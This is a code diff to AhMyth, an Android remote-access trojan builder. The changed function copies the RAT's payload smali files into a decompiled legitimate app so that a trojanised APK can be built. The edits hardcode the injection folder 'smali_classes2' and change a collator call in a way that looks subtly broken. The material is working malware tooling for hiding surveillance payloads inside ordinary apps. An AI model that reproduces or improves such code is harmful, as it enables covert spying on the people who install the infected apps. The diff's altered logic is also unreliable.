@@ -19,7 +19,7 @@ $appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {
                 .filter((item) => item.isDirectory() +
                 !(ignoreDirs.includes(item.name)))
                 .map((item) => item.name)
-            var collator = new Intl.Collator([], {numeric: true});
+            var collator = Intl.Collator({numeric: true});
             smaliList.sort((a, b) => collator.compare(a, b));
             var lastSmali = smaliList[smaliList.length -1];
             if (lastSmali == "smali") {
@@ -35,7 +35,7 @@ $appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {
 
                     $appCtrl.Log("Copying AhMyth Payload Files to Original App...");
                     $appCtrl.Log();
-                    fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, payloadSmaliFolder), (error) => {
+                    fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, "smali_classes2"), (error) => {
                         if (error) {
                             $appCtrl.Log('Copying Failed!', CONSTANTS.logStatus.FAIL);
                             $appCtrl.Log();
@@ -123,7 +123,7 @@ fs.readdir(apkFolder, { withFileTypes: true }, (error, files) => {
                 
                 console.log("Copying AhMyth Payload Files to Original App...");
                 console.log();
-                fs.copy(path.join(ahmythApkFolderPath, "smali"), path.join(apkFolder, payloadSmaliFolder), (error) => { 
+                fs.copy(path.join(ahmythApkFolderPath, "smali"), path.join(apkFolder, "smali_classes2"), (error) => { 
                     if (error) {
                         console.log('Copying Failed!');
                         console.log();
